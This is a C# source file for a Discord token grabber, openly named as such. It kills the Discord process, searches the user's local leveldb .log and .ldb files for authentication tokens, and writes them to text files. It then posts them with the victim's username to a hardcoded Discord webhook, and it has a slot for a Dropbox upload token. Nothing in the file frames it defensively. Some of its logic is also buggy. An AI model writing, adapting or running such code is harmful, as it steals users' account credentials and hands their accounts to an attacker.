using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Net.Http;

namespace WebhookDiscordTokenGrabber
{
    public class Grabbing
    {
        public static void KillDiscord()
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("Discord");
                foreach (var process in processes)
                {

                    process.Kill();
                }
            }
            catch (Exception ex)
            {
                return;
            }
            
        }

        public static string DropboxToken = "abcdefghijklmnopqrstuvwxyz"; // PASTE YOUR DROPBOX DEVELOPER APP TOKEN HERE. (GIVE THE APP FULL ACCESS TO YOUR DROPBOX!)

        public static void UploadLogFile()
        {
            var files = SearchForFile(); // to get log files
            if (files.Count == 0)
            {
                Console.WriteLine("Didn't find any log files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        Console.WriteLine($"Token={match.ToString()}");
                        using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt", true))
                        {
                            sw.WriteLine($"Token={match.ToString()}");
                        }
                    }
                }
            }

            string uploadfile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt";

            

            List<string> SearchForFile()
            {
                List<string> ldbFiles = new List<string>();
                string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

                if (!Directory.Exists(discordPath))
                {
                    Console.WriteLine("Discord path not found");
                    return ldbFiles;
                }

                foreach (string file in Directory.GetFiles(discordPath, "*.log", SearchOption.TopDirectoryOnly))
                {
                    string rawText = File.ReadAllText(file);
                    if (rawText.Contains("oken"))
                    {
                        Console.WriteLine($"{Path.GetFileName(file)} added");
                        ldbFiles.Add(rawText);
                    }
                }
                return ldbFiles;
            }
        }



        public static void UploadldbFile()
        {
            var files = SearchForFile(); // to get ldb files
            if (files.Count == 0)
            {
                Console.WriteLine("Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        Console.WriteLine($"Token={match.ToString()}");
                        using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt", true))
                        {
                            sw.WriteLine($"Token={match.ToString()}");
                        }
                    }
                }
            }

            string uploadfile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt";



            List<string> SearchForFile()
            {
                List<string> ldbFiles = new List<string>();
                string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

                if (!Directory.Exists(discordPath))
                {
                    Console.WriteLine("Discord path not found");
                    return ldbFiles;
                }

                foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
                {
                    string rawText = File.ReadAllText(file);
                    if (rawText.Contains("oken"))
                    {
                        Console.WriteLine($"{Path.GetFileName(file)} added");
                        ldbFiles.Add(rawText);
                    }
                }
                return ldbFiles;
            }
            
        }

        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/737793943919526000/f9ZnPGC8LeQfoAQkt3w5HUP5xTjXBXZiKB6weYL-O7Ccedj0o85sCjqkq1BWeZaUPoey";


        public static void ReportTokens(/*List<string> tokenReport*/)
        {
            if (File.Exists(System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt")))
            {
                string writtenldbtoken = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt");

                //.ldb upload
                try
                {
                    HttpClient client = new HttpClient();
                    Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", writtenldbtoken)}" },
                        { "username", "Anarchy Token Grabber" },
                        { "avatar_url", "https://cdn.discordapp.com/attachments/737777108243316807/737788069192794122/kai_green_eye_and_contur.jpeg" }
                    };

                    client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
                }
                catch { }
            }
            else
            {
                Console.WriteLine("ldb token does not exists");
            }
            
            if (File.Exists(System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt")))
            {
                string writtenlogtoken = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt");
                //.log upload
                try
                {
                    HttpClient client = new HttpClient();
                    Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", writtenlogtoken)}" },
                        { "username", "Kai's Token Grabber" },
                        { "avatar_url", "https://cdn.discordapp.com/attachments/737777108243316807/737788069192794122/kai_green_eye_and_contur.jpeg" }
                    };

                    client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
                }
                catch { }
            }
            else
            {
                Console.WriteLine("log token does not exists");
            }
        }
    }
}

